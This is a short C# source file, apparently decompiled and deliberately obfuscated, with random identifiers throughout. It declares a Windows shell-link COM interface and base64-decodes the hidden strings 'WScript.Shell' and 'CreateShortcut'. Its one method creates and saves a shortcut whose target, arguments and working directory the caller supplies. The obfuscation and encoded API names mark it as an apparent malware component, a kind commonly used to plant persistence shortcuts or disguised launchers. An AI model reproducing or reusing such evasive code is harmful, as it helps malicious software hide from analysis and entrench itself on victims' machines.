using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ALzLGBAFaCqNDAE;

public class IfLOoLTZfyNo
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface rrthmythDpkW
	{
		[DispId(0)]
		string bHykNabQXNqLveB
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string ynZHFBUrRtRppp
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string BNpAjoXLvLMYEci
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string FrxVODxcmglGn
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string lPKlbxrGMfV
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string CZVLkZLmVQL
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string sRHspIxrNo
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int pVmkvtYMkmmx
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string tZEPDzXJOqBh
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type DZUiSNtXtYH = Type.GetTypeFromProgID(RMvUnHFCuFhAD.tRvIdsqgaYol("V1NjcmlwdC5TaGVsbA=="));

	private static object EJKTBgjJbSXCnDl = Activator.CreateInstance(DZUiSNtXtYH);

	public static void gRBMeBwJtM(string warXjMtbbPAtt, string hXpbZJQuZUtfW, string uCIgFApkAjGH, string nCDtJDyemjijGN, string cAjEOoVhUnBpeeo, string hGFfqZzWeoNV, string zIuaKFMWJG)
	{
		rrthmythDpkW rrthmythDpkW = (rrthmythDpkW)DZUiSNtXtYH.InvokeMember(RMvUnHFCuFhAD.tRvIdsqgaYol("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, EJKTBgjJbSXCnDl, new object[1] { warXjMtbbPAtt });
		rrthmythDpkW.BNpAjoXLvLMYEci = cAjEOoVhUnBpeeo;
		rrthmythDpkW.FrxVODxcmglGn = hGFfqZzWeoNV;
		rrthmythDpkW.sRHspIxrNo = hXpbZJQuZUtfW;
		rrthmythDpkW.tZEPDzXJOqBh = nCDtJDyemjijGN;
		rrthmythDpkW.ynZHFBUrRtRppp = uCIgFApkAjGH;
		if (!string.IsNullOrEmpty(zIuaKFMWJG))
		{
			rrthmythDpkW.lPKlbxrGMfV = zIuaKFMWJG;
		}
		rrthmythDpkW.Save();
	}
}
